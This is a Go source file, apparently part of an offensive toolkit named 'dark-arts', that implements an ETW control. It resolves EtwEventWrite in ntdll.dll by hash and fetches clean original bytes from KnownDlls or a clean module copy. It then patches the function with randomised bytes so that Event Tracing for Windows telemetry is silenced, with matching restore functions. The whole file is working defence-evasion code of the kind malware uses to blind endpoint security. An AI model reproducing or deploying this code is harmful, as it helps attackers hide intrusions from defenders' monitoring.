//go:build windows && amd64

package securityctl

import (
	"fmt"

	"dark-arts/pkg/evasion"
)

type ETWControl struct {
	baseControl
	fp *funcPatch
}

func NewETWControl() *ETWControl {
	return &ETWControl{baseControl: newBaseControl("etw")}
}

func (e *ETWControl) Initialize() error {
	e.mu.Lock()
	defer e.mu.Unlock()
	if e.status == StatusInitialized || e.status == StatusEnabled || e.status == StatusDisabled {
		return e.initErr
	}

	fp, err := resolveFuncByHash("ntdll.dll", "EtwEventWrite")
	if err != nil {
		e.initErr = err
		e.status = StatusUnsupported
		return err
	}

	knownDllFP, kerr := resolveFuncFromKnownDlls("ntdll.dll", "EtwEventWrite")
	if kerr == nil && knownDllFP != nil {
		fp.orig = knownDllFP.orig
	}

	cleanBase, cerr := evasion.DiagCleanBase()
	if cerr == nil && cleanBase != 0 {
		cleanFP, err := resolveFuncFromBase(cleanBase, "EtwEventWrite")
		if err == nil && cleanFP != nil {
			fp.orig = cleanFP.orig
		}
	}

	e.fp = fp
	e.status = StatusInitialized
	return nil
}

func (e *ETWControl) Enable() error {
	e.mu.Lock()
	defer e.mu.Unlock()
	if e.status == StatusUnknown {
		return ErrNotInitialized
	}
	if e.status == StatusUnsupported {
		return ErrInitializeFailed
	}
	if e.fp == nil {
		e.status = StatusDisabled
		return fmt.Errorf("securityctl: etw: not initialized")
	}
	e.fp.patch = randomEtwPatchBytes()
	if err := applyPatch(e.fp); err != nil {
		e.status = StatusDisabled
		return err
	}
	e.status = StatusEnabled
	return nil
}

func (e *ETWControl) Disable() error {
	e.mu.Lock()
	defer e.mu.Unlock()
	if e.fp == nil {
		e.status = StatusDisabled
		return nil
	}
	if err := restorePatch(e.fp); err != nil {
		return err
	}
	e.status = StatusDisabled
	return nil
}

func (e *ETWControl) Restore() {
	e.mu.Lock()
	defer e.mu.Unlock()
	if e.fp == nil {
		return
	}
	_ = restorePatch(e.fp)
}
